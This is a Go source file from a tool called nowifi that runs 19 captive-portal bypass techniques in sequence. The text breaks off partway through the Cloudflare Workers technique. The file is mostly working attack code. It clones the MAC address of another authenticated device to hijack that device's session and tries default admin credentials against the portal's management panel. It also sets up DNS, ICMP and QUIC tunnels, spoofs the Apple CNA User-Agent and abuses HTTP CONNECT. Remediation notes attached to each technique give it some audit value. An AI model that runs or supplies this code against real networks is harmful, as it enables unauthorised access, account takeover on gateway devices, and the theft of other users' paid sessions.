// Copyright (C) 2026 Mikko Parkkola. All rights reserved.
// Licensed under AGPL-3.0. See LICENSE file.

// Package bypass implements 19 ordered captive portal bypass techniques.
//
// After a successful bypass, internet works system-wide (including browser)
// with zero manual steps. All changes are temporary and restored when nowifi
// exits via the guard package.
//
// Techniques ordered most-powerful-first:
//
//  1. IPv6 bypass          - portal only filters IPv4
//  2. HTTPS/WS tunnel      - chisel through Cloudflare to your server
//  3. CNA User-Agent spoof - portal auto-approves Apple CNA requests
//  4. JS-only bypass       - portal enforces auth only in JavaScript
//  5. HTTP CONNECT abuse   - tunnel through portal's transparent proxy
//  6. MAC clone (idle)     - steal an inactive authenticated device's session
//  7. MAC clone (any)      - steal any authenticated device's session
//  8. DNS tunnel           - IP-over-DNS through your server
//  9. ICMP tunnel          - IP-over-ping through your server
//  10. VPN on port 53       - WireGuard/OpenVPN on DNS port
//  11. Whitelist domain     - tunnel via whitelisted CDN domain
//  12. Session cookie replay- sniff and replay portal auth cookies
//  13. Portal default creds - try default admin passwords on portal
//  14. MAC rotate           - fresh random MAC for new session/quota
//  15. DHCP rotate          - new IP via DHCP release/renew cycle
//  16. QUIC tunnel          - Hysteria2 over UDP/443 (looks like HTTP/3)
//  17. CF Workers proxy     - serverless proxy via Cloudflare Workers
//  18. NTP tunnel           - data over UDP/123 (almost never blocked)
//  19. DoH tunnel           - DNS-over-HTTPS to bypass DNS interception
package bypass

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"github.com/MikkoParkkola/nowifi/internal/platform"
	"github.com/MikkoParkkola/nowifi/internal/tunnel"
)

// Method identifies a specific bypass technique.
type Method string

const (
	IPv6Bypass      Method = "ipv6_bypass"
	ChiselTunnel    Method = "chisel_tunnel"
	CNASpoof        Method = "cna_useragent_spoof"
	JSBypass        Method = "js_only_bypass"
	HTTPConnect     Method = "http_connect_abuse"
	MACCloneIdle    Method = "mac_clone_idle"
	MACClone        Method = "mac_clone"
	DNSTunnel       Method = "dns_tunnel"
	ICMPTunnel      Method = "icmp_tunnel"
	VPNPort53       Method = "vpn_port_53"
	WhitelistDomain Method = "whitelist_domain"
	SessionReplay   Method = "session_cookie_replay"
	PortalCreds     Method = "portal_default_creds"
	MACRotate       Method = "mac_rotate"
	DHCPRotate      Method = "dhcp_rotate"
	QUICTunnel      Method = "quic_tunnel"
	CFWorkers       Method = "cf_workers_proxy"
	NTPTunnel       Method = "ntp_tunnel"
	DoHTunnel       Method = "doh_tunnel"
)

// Config holds user-specified settings for the bypass engine.
type Config struct {
	Interface    string
	TunnelServer string
	DNSDomain    string
	ICMPServer   string
	QUICServer   string
	NTPServer    string
	CFWorkersURL string
	VPNServer    string
	Stealth      bool
}

// Result records the outcome of a single bypass attempt.
type Result struct {
	Method      Method
	Success     bool
	Severity    string // critical, high, medium, low, info
	Impact      string
	Details     string
	Remediation string
	Tunnel      *tunnel.Handle
}

// ---------------------------------------------------------------------------
// Probe result interfaces -- minimal types needed from the probe package.
// The actual probe package implements these; we define them here so bypass
// can compile independently.
// ---------------------------------------------------------------------------

// ProbeResult holds the status of a single protocol probe.
type ProbeResult struct {
	IsOpen  bool
	Details string
}

// WhitelistResult holds a probed whitelisted domain.
type WhitelistResult struct {
	Domain  string
	IsOpen  bool
	Details string
}

// PortResult holds a probed TCP port.
type PortResult struct {
	Port    int
	Service string
	IsOpen  bool
}

// ProbeResults is the full set of probe outcomes consumed by the bypass engine.
// This mirrors the probe.Results struct; the caller maps from probe.Results to this.
type ProbeResults struct {
	DNS        ProbeResult
	ICMP       ProbeResult
	IPv6       ProbeResult
	Cloudflare ProbeResult
	QUIC       ProbeResult
	NTP        ProbeResult
	DoH        ProbeResult

	Whitelists       []WhitelistResult
	OpenPorts        []PortResult
	TunnelServerPorts []PortResult
}

// PlatformOps abstracts the platform-specific operations needed by bypass
// techniques. This allows testing with mocks and decouples from the concrete
// platform package's build-tag-gated functions.
type PlatformOps interface {
	GetGateway(iface string) string
	GetCurrentMAC(iface string) string
	GetArpTable() []platform.ArpEntry
	SetMAC(iface, mac string) bool
	RenewDHCP(iface string)
	GenerateRandomMAC() string
}

// RunBypasses tries all 19 bypass techniques in order, stopping on the
// first success. Returns the list of all attempted results.
func RunBypasses(probes *ProbeResults, config *Config, plat PlatformOps) []Result {
	if plat == nil {
		plat = &defaultPlatformOps{}
	}

	hasServer := config.TunnelServer != ""
	if !hasServer {
		logStatus("No tunnel server configured -- 10 serverless techniques available.")
		logStatus("For all 19: run `nowifi server create` first.")
	}

	type technique struct {
		name string
		fn   func() Result
	}

	techniques := []technique{
		{"IPv6 bypass", func() Result { return tryIPv6(probes) }},
		{"HTTPS tunnel (chisel)", func() Result { return tryChisel(config, probes) }},
		{"CNA User-Agent spoof", func() Result { return tryCNASpoof() }},
		{"JS-only bypass", func() Result { return tryJSBypass() }},
		{"HTTP CONNECT abuse", func() Result { return tryHTTPConnect(probes, config, plat) }},
		{"MAC clone (idle)", func() Result { return tryMACClone(config.Interface, true, plat) }},
		{"MAC clone (any)", func() Result { return tryMACClone(config.Interface, false, plat) }},
		{"DNS tunnel", func() Result { return tryDNSTunnel(config, probes) }},
		{"ICMP tunnel", func() Result { return tryICMPTunnel(config, probes) }},
		{"VPN port 53", func() Result { return tryVPNPort53(config, probes) }},
		{"Whitelist tunnel", func() Result { return tryWhitelist(probes) }},
		{"Session cookie replay", func() Result { return trySessionReplay(config.Interface, plat) }},
		{"Portal default creds", func() Result { return tryDefaultCreds(config.Interface, plat) }},
		{"MAC rotate", func() Result { return tryMACRotate(config.Interface, plat) }},
		{"DHCP rotate", func() Result { return tryDHCPRotate(config.Interface, plat) }},
		{"QUIC tunnel (Hysteria2)", func() Result { return tryQUICTunnel(config, probes) }},
		{"Cloudflare Workers proxy", func() Result { return tryCFWorkers(config, probes) }},
		{"NTP tunnel", func() Result { return tryNTPTunnel(config, probes) }},
		{"DoH tunnel", func() Result { return tryDoHTunnel(probes) }},
	}

	var results []Result
	for _, t := range techniques {
		logStatus("Trying: %s...", t.name)
		r := func() (result Result) {
			defer func() {
				if rec := recover(); rec != nil {
					result = Result{Method: MACRotate, Success: false, Details: fmt.Sprintf("panic: %v", rec)}
				}
			}()
			return t.fn()
		}()

		results = append(results, r)
		if r.Success {
			logStatus("SUCCESS: %s", t.name)
			// For tunnel-based methods, set system SOCKS proxy so browser works.
			if r.Tunnel != nil && r.Tunnel.Active && r.Tunnel.LocalPort > 0 {
				setSystemSOCKSProxy(config.Interface, r.Tunnel.LocalPort)
			}
			return results
		}
		logStatus("Failed: %s", t.name)
	}

	return results
}

// ClearSystemSOCKSProxy removes the system-wide SOCKS proxy.
// Called by the guard package on cleanup.
func ClearSystemSOCKSProxy(iface string) {
	service := getNetworkService(iface)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_ = exec.CommandContext(ctx, "networksetup", "-setsocksfirewallproxystate", service, "off").Run()
}

// ---------------------------------------------------------------------------
// System proxy management
// ---------------------------------------------------------------------------

func setSystemSOCKSProxy(iface string, port int) {
	service := getNetworkService(iface)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_ = exec.CommandContext(ctx, "networksetup", "-setsocksfirewallproxy", service, "127.0.0.1", fmt.Sprintf("%d", port)).Run()
	_ = exec.CommandContext(ctx, "networksetup", "-setsocksfirewallproxystate", service, "on").Run()
}

var networkServiceRE = regexp.MustCompile(`Hardware Port:\s*(.+)`)

func getNetworkService(iface string) string {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	out, err := exec.CommandContext(ctx, "networksetup", "-listallhardwareports").Output()
	if err != nil {
		return "Wi-Fi" // fallback
	}

	lines := strings.Split(string(out), "\n")
	for i, line := range lines {
		if strings.Contains(line, "Device: "+iface) && i > 0 {
			m := networkServiceRE.FindStringSubmatch(lines[i-1])
			if len(m) > 1 {
				return strings.TrimSpace(m[1])
			}
		}
	}
	return "Wi-Fi" // fallback
}

// ---------------------------------------------------------------------------
// Internet connectivity check
// ---------------------------------------------------------------------------

func hasInternet() bool {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	req, _ := http.NewRequestWithContext(ctx, "GET", "http://connectivitycheck.gstatic.com/generate_204", nil)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == 204
}

// ---------------------------------------------------------------------------
// Technique 1: IPv6 bypass
// ---------------------------------------------------------------------------

func tryIPv6(probes *ProbeResults) Result {
	if !probes.IPv6.IsOpen {
		return Result{Method: IPv6Bypass, Success: false, Details: "No IPv6 connectivity"}
	}
	return Result{
		Method:      IPv6Bypass,
		Success:     true,
		Severity:    "critical",
		Impact:      "Full unrestricted IPv6 internet -- bypasses all portal controls",
		Details:     probes.IPv6.Details,
		Remediation: "Apply captive portal ACLs to IPv6. Filter RA/DHCPv6 or mirror IPv4 rules.",
	}
}

// ---------------------------------------------------------------------------
// Technique 2: HTTPS/WS tunnel (chisel)
// ---------------------------------------------------------------------------

func tryChisel(config *Config, probes *ProbeResults) Result {
	// Strategy 1: Via Cloudflare Tunnel (default URL, port 443)
	cfReachable := probes.Cloudflare.IsOpen
	for _, w := range probes.Whitelists {
		if w.IsOpen {
			cfReachable = true
			break
		}
	}

	if cfReachable && config.TunnelServer != "" {
		handle, err := tunnel.StartChisel(config.TunnelServer, 1080, 15*time.Second)
		if err == nil {
			if tunnel.VerifySOCKS(handle.LocalPort) {
				return Result{
					Method:      ChiselTunnel,
					Success:     true,
					Severity:    "critical",
					Impact:      "Full internet via system SOCKS proxy (auto-configured)",
					Details:     fmt.Sprintf("HTTPS/WebSocket tunnel through %s", config.TunnelServer),
					Remediation: "Block WebSocket upgrades pre-auth. Inspect TLS SNI. Whitelist only portal domains.",
					Tunnel:      handle,
				}
			}
			handle.Stop()
		}
	}

	// Strategy 2: Direct to server on any open port found during stealth scan
	if config.TunnelServer != "" {
		serverHost := ""
		if u, err := url.Parse(config.TunnelServer); err == nil && u.Hostname() != "" {
			serverHost = u.Hostname()
		}

		var serverIP string
		if serverHost != "" {
			if addrs, err := net.LookupHost(serverHost); err == nil && len(addrs) > 0 {
				serverIP = addrs[0]
			}
		}

		if serverIP != "" {
			for _, pr := range probes.TunnelServerPorts {
				if !pr.IsOpen {
					continue
				}
				directURL := fmt.Sprintf("http://%s:%d", serverIP, pr.Port)
				logStatus("  Trying chisel direct: %s", directURL)
				handle, err := tunnel.StartChisel(directURL, 1080, 8*time.Second)
				if err != nil {
					continue
				}
				if tunnel.VerifySOCKS(handle.LocalPort) {
					return Result{
						Method:      ChiselTunnel,
						Success:     true,
						Severity:    "critical",
						Impact:      fmt.Sprintf("Full internet via direct tunnel on port %d", pr.Port),
						Details:     fmt.Sprintf("Chisel direct to %s:%d (bypassed Cloudflare, portal allows port %d)", serverIP, pr.Port, pr.Port),
						Remediation: fmt.Sprintf("Block outbound port %d for unauthenticated clients. Inspect non-standard port traffic.", pr.Port),
						Tunnel:      handle,
					}
				}
				handle.Stop()
			}
		}
	}

	return Result{Method: ChiselTunnel, Success: false, Details: "No route to tunnel server (CF blocked, no direct ports open)"}
}

// ---------------------------------------------------------------------------
// Technique 3: CNA User-Agent spoof
// ---------------------------------------------------------------------------

func tryCNASpoof() Result {
	type uaEntry struct {
		ua   string
		name string
	}

	agents := []uaEntry{
		{"CaptiveNetworkSupport/1.0 wispr", "Apple CNA"},
		{"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) CaptiveNetworkSupport", "iOS CNA"},
		{"wispr", "Wispr generic"},
	}

	for _, a := range agents {
		ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
		req, _ := http.NewRequestWithContext(ctx, "GET", "http://connectivitycheck.gstatic.com/generate_204", nil)
		req.Header.Set("User-Agent", a.ua)

		client := &http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse // do not follow redirects
			},
		}
		resp, err := client.Do(req)
		cancel()

		if err != nil {
			continue
		}
		resp.Body.Close()

		if resp.StatusCode == 204 {
			return Result{
				Method:      CNASpoof,
				Success:     true,
				Severity:    "high",
				Impact:      fmt.Sprintf("Internet access via %s User-Agent spoofing", a.name),
				Details:     fmt.Sprintf("Portal auto-approved UA: %s", a.ua),
				Remediation: "Do not auto-approve CNA/Wispr User-Agents. Require explicit authentication for all clients.",
			}
		}
	}

	return Result{Method: CNASpoof, Success: false, Details: "No UA bypass found"}
}

// ---------------------------------------------------------------------------
// Technique 4: JS-only bypass
// ---------------------------------------------------------------------------

func tryJSBypass() Result {
	testURLs := []string{
		"http://httpbin.org/ip",
		"http://ifconfig.me/ip",
		"http://icanhazip.com",
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	for _, testURL := range testURLs {
		ctx, cancel := context.WithTimeout(context.Background(), 8*time.Second)
		req, _ := http.NewRequestWithContext(ctx, "GET", testURL, nil)
		req.Header.Set("User-Agent", "curl/8.0")

		resp, err := client.Do(req)
		cancel()

		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.StatusCode == 200 {
			bodyLower := strings.ToLower(string(body))
			portalKeywords := []string{"login", "portal", "captive", "auth"}
			isPortal := false
			for _, kw := range portalKeywords {
				if strings.Contains(bodyLower, kw) {
					isPortal = true
					break
				}
			}
			if !isPortal {
				return Result{
					Method:      JSBypass,
					Success:     true,
					Severity:    "high",
					Impact:      "Internet access -- portal only enforces auth in JavaScript",
					Details:     fmt.Sprintf("Direct HTTP request to %s returned real content (no redirect)", testURL),
					Remediation: "Enforce captive portal at the firewall/gateway level, not in client-side JavaScript.",
				}
			}
		}
	}

	return Result{Method: JSBypass, Success: false, Details: "Portal has server-side enforcement"}
}

// ---------------------------------------------------------------------------
// Technique 5: HTTP CONNECT abuse
// ---------------------------------------------------------------------------

func tryHTTPConnect(probes *ProbeResults, config *Config, plat PlatformOps) Result {
	gateway := plat.GetGateway(config.Interface)
	if gateway == "" {
		return Result{Method: HTTPConnect, Success: false, Details: "No gateway"}
	}

	for _, proxyPort := range []int{80, 8080, 3128} {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		conn, err := (&net.Dialer{}).DialContext(ctx, "tcp", fmt.Sprintf("%s:%d", gateway, proxyPort))
		if err != nil {
			cancel()
			continue
		}

		_, _ = conn.Write([]byte("CONNECT httpbin.org:443 HTTP/1.1\r\nHost: httpbin.org\r\n\r\n"))
		buf := make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		n, _ := conn.Read(buf)
		conn.Close()
		cancel()

		resp := string(buf[:n])
		if strings.Contains(resp, "200") {
			return Result{
				Method:      HTTPConnect,
				Success:     true,
				Severity:    "high",
				Impact:      fmt.Sprintf("HTTP CONNECT tunnel via gateway %s:%d", gateway, proxyPort),
				Details:     "Portal's transparent proxy allows CONNECT to arbitrary hosts",
				Remediation: "Block HTTP CONNECT method for unauthenticated clients. Restrict proxy to whitelisted destinations only.",
			}
		}
	}

	return Result{Method: HTTPConnect, Success: false, Details: "CONNECT not available through gateway"}
}

// ---------------------------------------------------------------------------
// Techniques 6-7: MAC clone (idle / any)
// ---------------------------------------------------------------------------

func tryMACClone(iface string, idleOnly bool, plat PlatformOps) Result {
	method := MACClone
	if idleOnly {
		method = MACCloneIdle
	}

	gateway := plat.GetGateway(iface)
	if gateway == "" {
		return Result{Method: method, Success: false, Details: "No gateway"}
	}

	ourMAC := plat.GetCurrentMAC(iface)
	arpTable := plat.GetArpTable()

	var candidates []platform.ArpEntry
	for _, entry := range arpTable {
		if entry.Interface != iface {
			continue
		}
		if entry.IP == gateway {
			continue
		}
		if strings.HasPrefix(entry.MAC, "ff:ff") || entry.MAC == "(incomplete)" || len(entry.MAC) < 10 {
			continue
		}
		if entry.MAC == ourMAC {
			continue
		}
		candidates = append(candidates, entry)
	}

	if len(candidates) == 0 {
		return Result{Method: method, Success: false, Details: "No devices in ARP table to clone"}
	}

	if idleOnly {
		// Identify idle devices: those that don't respond to ping.
		var idle []platform.ArpEntry
		limit := len(candidates)
		if limit > 10 {
			limit = 10
		}
		for _, c := range candidates[:limit] {
			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
			err := exec.CommandContext(ctx, "ping", "-c", "1", "-W", "1", c.IP).Run()
			cancel()
			if err != nil {
				idle = append(idle, c)
			}
		}
		if len(idle) == 0 {
			return Result{Method: method, Success: false, Details: "No idle devices found"}
		}
		candidates = idle
	}

	// Try each candidate (up to 5).
	limit := len(candidates)
	if limit > 5 {
		limit = 5
	}
	for _, target := range candidates[:limit] {
		if !plat.SetMAC(iface, target.MAC) {
			continue
		}
		time.Sleep(time.Second)
		plat.RenewDHCP(iface)
		time.Sleep(3 * time.Second)

		if hasInternet() {
			label := "Direct clone."
			if idleOnly {
				label = "Targeted idle device to avoid collision."
			}
			return Result{
				Method:   method,
				Success:  true,
				Severity: "critical",
				Impact: fmt.Sprintf("Full internet by cloning %sdevice MAC %s (%s)",
					func() string {
						if idleOnly {
							return "idle "
						}
						return ""
					}(), target.MAC, target.IP),
				Details:     fmt.Sprintf("Portal uses MAC-only auth. %s", label),
				Remediation: "Use 802.1X. Enable client isolation. Bind sessions to MAC+IP+DHCP lease. Detect duplicate MACs.",
			}
		}
	}

	// Restore original MAC.
	plat.SetMAC(iface, ourMAC)
	plat.RenewDHCP(iface)

	return Result{
		Method:  method,
		Success: false,
		Details: fmt.Sprintf("Tried %d MACs, none granted access", limit),
	}
}

// ---------------------------------------------------------------------------
// Technique 8: DNS tunnel
// ---------------------------------------------------------------------------

func tryDNSTunnel(config *Config, probes *ProbeResults) Result {
	if !probes.DNS.IsOpen {
		return Result{Method: DNSTunnel, Success: false, Details: "DNS not open"}
	}
	if config.DNSDomain == "" {
		return Result{Method: DNSTunnel, Success: false, Details: "No DNS tunnel domain configured (use --dns-domain)"}
	}

	handle, err := tunnel.StartDNSTunnel(config.DNSDomain, "", 30*time.Second)
	if err != nil {
		return Result{Method: DNSTunnel, Success: false, Details: fmt.Sprintf("Failed: %v", err)}
	}

	if tunnel.VerifyDirect() {
		return Result{
			Method:      DNSTunnel,
			Success:     true,
			Severity:    "high",
			Impact:      "Internet via DNS tunnel (50-500 Kbps)",
			Details:     fmt.Sprintf("IP-over-DNS through %s", config.DNSDomain),
			Remediation: "Restrict DNS to portal resolvers. Block UDP/53 to external IPs. Inspect DNS for tunnel signatures.",
			Tunnel:      handle,
		}
	}

	handle.Stop()
	return Result{Method: DNSTunnel, Success: false, Details: "Tunnel connected but no internet"}
}

// ---------------------------------------------------------------------------
// Technique 9: ICMP tunnel
// ---------------------------------------------------------------------------

func tryICMPTunnel(config *Config, probes *ProbeResults) Result {
	if !probes.ICMP.IsOpen {
		return Result{Method: ICMPTunnel, Success: false, Details: "ICMP not open"}
	}
	if config.ICMPServer == "" {
		return Result{Method: ICMPTunnel, Success: false, Details: "No ICMP server configured (use --icmp-server)"}
	}

	handle, err := tunnel.StartICMPTunnel(config.ICMPServer, 15*time.Second)
	if err != nil {
		return Result{Method: ICMPTunnel, Success: false, Details: fmt.Sprintf("Failed: %v", err)}
	}

	if tunnel.VerifyDirect() {
		return Result{
			Method:      ICMPTunnel,
			Success:     true,
			Severity:    "high",
			Impact:      "Internet via ICMP tunnel (100-300 Kbps)",
			Details:     fmt.Sprintf("IP-over-ICMP to %s", config.ICMPServer),
			Remediation: "Block/rate-limit ICMP to external hosts. Allow only to gateway.",
			Tunnel:      handle,
		}
	}

	handle.Stop()
	return Result{Method: ICMPTunnel, Success: false, Details: "Tunnel connected but no internet"}
}

// ---------------------------------------------------------------------------
// Technique 10: VPN on port 53
// ---------------------------------------------------------------------------

func tryVPNPort53(config *Config, probes *ProbeResults) Result {
	if config.VPNServer == "" {
		return Result{Method: VPNPort53, Success: false, Details: "No VPN server configured (use --vpn-server)"}
	}

	// Check if port 53 UDP is open.
	open53 := false
	for _, p := range probes.OpenPorts {
		if p.Port == 53 && p.IsOpen {
			open53 = true
			break
		}
	}
	if !open53 && !probes.DNS.IsOpen {
		return Result{Method: VPNPort53, Success: false, Details: "Port 53 not open"}
	}

	// Try WireGuard.
	if wg, err := exec.LookPath("wg-quick"); err == nil {
		_ = wg // use the found path
		ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
		err := exec.CommandContext(ctx, "sudo", "wg-quick", "up", "wg-nowifi").Run()
		cancel()

		if err == nil {
			time.Sleep(3 * time.Second)
			if hasInternet() {
				return Result{
					Method:      VPNPort53,
					Success:     true,
					Severity:    "high",
					Impact:      "Full internet via WireGuard VPN on port 53",
					Details:     fmt.Sprintf("WireGuard to %s:53 -- portal allows UDP/53", config.VPNServer),
					Remediation: "Inspect UDP/53 traffic. Block non-DNS payloads on port 53. Use DNS response validation.",
				}
			}
		}
	}

	return Result{Method: VPNPort53, Success: false, Details: "WireGuard not available or connection failed"}
}

// ---------------------------------------------------------------------------
// Technique 11: Whitelist domain abuse
// ---------------------------------------------------------------------------

func tryWhitelist(probes *ProbeResults) Result {
	var openDomains []string
	for _, w := range probes.Whitelists {
		if w.IsOpen {
			openDomains = append(openDomains, w.Domain)
		}
	}

	if len(openDomains) == 0 {
		return Result{Method: WhitelistDomain, Success: false, Details: "No whitelisted domains reachable"}
	}

	return Result{
		Method:      WhitelistDomain,
		Success:     false,
		Severity:    "medium",
		Details:     fmt.Sprintf("Whitelisted domains found (%s) but no dedicated tunnel server on them. Chisel via CF is the primary exploit.", strings.Join(openDomains, ", ")),
		Remediation: "Minimize whitelisted domains. Block WebSocket/tunneling on whitelisted destinations.",
	}
}

// ---------------------------------------------------------------------------
// Technique 12: Session cookie replay
// ---------------------------------------------------------------------------

func trySessionReplay(iface string, plat PlatformOps) Result {
	gateway := plat.GetGateway(iface)
	if gateway == "" {
		return Result{Method: SessionReplay, Success: false, Details: "No gateway"}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	// Check if portal serves cookies over HTTP (sniffable).
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // intentional: probing LAN gateway
		},
	}

	req, _ := http.NewRequestWithContext(ctx, "GET", fmt.Sprintf("http://%s/", gateway), nil)
	resp, err := client.Do(req)
	if err != nil {
		return Result{Method: SessionReplay, Success: false, Details: "Portal uses HTTPS or no cookies found"}
	}
	defer resp.Body.Close()

	// Check if final URL is HTTP and has cookies.
	if strings.HasPrefix(resp.Request.URL.String(), "http://") && len(resp.Cookies()) > 0 {
		var cookieNames []string
		for _, c := range resp.Cookies() {
			cookieNames = append(cookieNames, c.Name)
		}
		return Result{
			Method:      SessionReplay,
			Success:     false,
			Severity:    "high",
			Details:     fmt.Sprintf("Portal serves cookies over HTTP (sniffable): %s. Full exploit requires monitor mode packet capture.", strings.Join(cookieNames, ", ")),
			Remediation: "Serve captive portal exclusively over HTTPS. Set Secure flag on all cookies.",
		}
	}

	return Result{Method: SessionReplay, Success: false, Details: "Portal uses HTTPS or no cookies found"}
}

// ---------------------------------------------------------------------------
// Technique 13: Portal default credentials
// ---------------------------------------------------------------------------

func tryDefaultCreds(iface string, plat PlatformOps) Result {
	gateway := plat.GetGateway(iface)
	if gateway == "" {
		return Result{Method: PortalCreds, Success: false, Details: "No gateway"}
	}

	adminPaths := []string{"/admin", "/login", "/manage", "/status", "/cgi-bin/luci", "/webfig/"}
	credPairs := [][2]string{
		{"admin", "admin"}, {"admin", "password"}, {"admin", ""},
		{"root", "admin"}, {"root", ""}, {"ubnt", "ubnt"},
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // intentional: LAN gateway admin
		},
	}

	for _, path := range adminPaths {
		for _, proto := range []string{"http", "https"} {
			adminURL := fmt.Sprintf("%s://%s%s", proto, gateway, path)

			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
			req, _ := http.NewRequestWithContext(ctx, "GET", adminURL, nil)
			resp, err := client.Do(req)
			cancel()

			if err != nil || resp.StatusCode != 200 {
				if resp != nil {
					resp.Body.Close()
				}
				continue
			}

			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			bodyLower := strings.ToLower(string(body))

			loginKeywords := []string{"username", "password", "login"}
			hasLogin := false
			for _, kw := range loginKeywords {
				if strings.Contains(bodyLower, kw) {
					hasLogin = true
					break
				}
			}
			if !hasLogin {
				continue
			}

			// Found a login form -- try default credentials.
			for _, cred := range credPairs {
				user, pass := cred[0], cred[1]
				ctx2, cancel2 := context.WithTimeout(context.Background(), 5*time.Second)
				postBody := fmt.Sprintf("username=%s&password=%s", user, pass)
				req2, _ := http.NewRequestWithContext(ctx2, "POST", adminURL, strings.NewReader(postBody))
				req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")

				resp2, err := client.Do(req2)
				cancel2()

				if err != nil {
					continue
				}

				body2, _ := io.ReadAll(resp2.Body)
				resp2.Body.Close()

				// Heuristic: if response no longer contains "login", creds worked.
				if resp2.StatusCode == 200 && !strings.Contains(strings.ToLower(string(body2[:min(500, len(body2))])), "login") {
					return Result{
						Method:      PortalCreds,
						Success:     true,
						Severity:    "critical",
						Impact:      fmt.Sprintf("Portal admin access with %s:%s at %s", user, pass, adminURL),
						Details:     "Default credentials on portal management interface. Can whitelist MAC or disable portal.",
						Remediation: "Change default admin credentials. Restrict management interface to wired/VLAN access. Require MFA for admin.",
					}
				}
			}
		}
	}

	return Result{Method: PortalCreds, Success: false, Details: "No admin panel found or default creds failed"}
}

// ---------------------------------------------------------------------------
// Technique 14: MAC rotate
// ---------------------------------------------------------------------------

func tryMACRotate(iface string, plat PlatformOps) Result {
	newMAC := plat.GenerateRandomMAC()
	if !plat.SetMAC(iface, newMAC) {
		return Result{Method: MACRotate, Success: false, Details: "Need sudo for MAC change"}
	}

	time.Sleep(time.Second)
	plat.RenewDHCP(iface)
	time.Sleep(3 * time.Second)

	if hasInternet() {
		return Result{
			Method:      MACRotate,
			Success:     true,
			Severity:    "high",
			Impact:      fmt.Sprintf("Internet with fresh MAC %s -- portal auto-approves new devices", newMAC),
			Details:     "No authentication required for new MAC addresses. Infinite sessions by rotating.",
			Remediation: "Require explicit authentication for all new devices. Don't auto-approve.",
		}
	}

	return Result{
		Method:      MACRotate,
		Success:     false,
		Severity:    "medium",
		Details:     fmt.Sprintf("Fresh MAC %s set but portal still requires auth. Use this for quota/time reset AFTER initial auth.", newMAC),
		Remediation: "Portal correctly requires auth for new devices. Time/quota bypass still possible by re-authenticating with new MAC.",
	}
}

// ---------------------------------------------------------------------------
// Technique 15: DHCP rotate
// ---------------------------------------------------------------------------

func tryDHCPRotate(iface string, plat PlatformOps) Result {
	plat.RenewDHCP(iface)
	time.Sleep(3 * time.Second)

	if hasInternet() {
		return Result{
			Method:      DHCPRotate,
			Success:     true,
			Severity:    "medium",
			Impact:      "Internet after DHCP renewal -- portal tracked by IP, not MAC",
			Details:     "DHCP renewal assigned a new IP that bypassed portal state.",
			Remediation: "Track sessions by MAC+IP. Don't rely on IP alone for portal state.",
		}
	}

	return Result{Method: DHCPRotate, Success: false, Details: "DHCP renewal didn't bypass portal"}
}

// ---------------------------------------------------------------------------
// Technique 16: QUIC tunnel (Hysteria2)
// ---------------------------------------------------------------------------

func tryQUICTunnel(config *Config, probes *ProbeResults) Result {
	if !probes.QUIC.IsOpen {
		return Result{Method: QUICTunnel, Success: false, Details: "UDP/443 (QUIC) blocked"}
	}

	server := config.QUICServer
	if server == "" {
		server = config.TunnelServer
	}
	if server == "" {
		return Result{Method: QUICTunnel, Success: false, Details: "No QUIC server configured"}
	}

	handle, err := tunnel.StartQUICTunnel(server, 1081, 15*time.Second)
	if err != nil {
		return Result{Method: QUICTunnel, Success: false, Details: fmt.Sprintf("Failed: %v", err)}
	}

	if tunnel.VerifySOCKS(handle.LocalPort) {
		return Result{
			Method:      QUICTunnel,
			Success:     true,
			Severity:    "critical",
			Impact:      "Full internet via QUIC tunnel (UDP/443 -- looks like HTTP/3)",
			Details:     fmt.Sprintf("Hysteria2 QUIC tunnel to %s. Portal only filters TCP, UDP passes through.", server),
			Remediation: "Inspect UDP/443 traffic. Block non-HTTP/3 QUIC connections for unauthenticated clients. Deploy QUIC-aware DPI.",
			Tunnel:      handle,
		}
	}

	handle.Stop()
	return Result{Method: QUICTunnel, Success: false, Details: "QUIC tunnel connected but verification failed"}
}

// ---------------------------------------------------------------------------
// Technique 17: Cloudflare Workers proxy
// ---------------------------------------------------------------------------

func tryCFWorkers(config *Config, probes *ProbeResults) Result {
	if config.CFWorkersURL == "" {
		return Result{Method: CFWorkers, Success: false, Details: "No CF Workers URL configured (use --cf-workers)"}
	}

	// Check if Cloudflare is reachable.
	cfOpen := probes.Cloudflare.IsOpen
	for _, w := range probes.Whitelists {
		if w.IsOpen && strings.Contains(strings.ToLower(w.Domain), "cloudflare") {
			cfOpen = true
			break
		}
	}
	if !cfOpen {
		return Result{Method: CFWorkers, Success: false, Details: "Cloudflare not reachable pre-auth"}
	}

	if tunnel.VerifyCFWorkersProxy(config.CFWorkersURL) {
		return Result{
			Method:      CFWorkers,
			Success:     true,
			Severity:    "critical",
			Impact:      "Full internet via Cloudflare Workers proxy (serverless, free)",
			Details:     fmt.Sprintf("CF Worker at %s proxies requests. Traffic goes to trusted Cloudflare IPs.", config.CFWorkersURL),
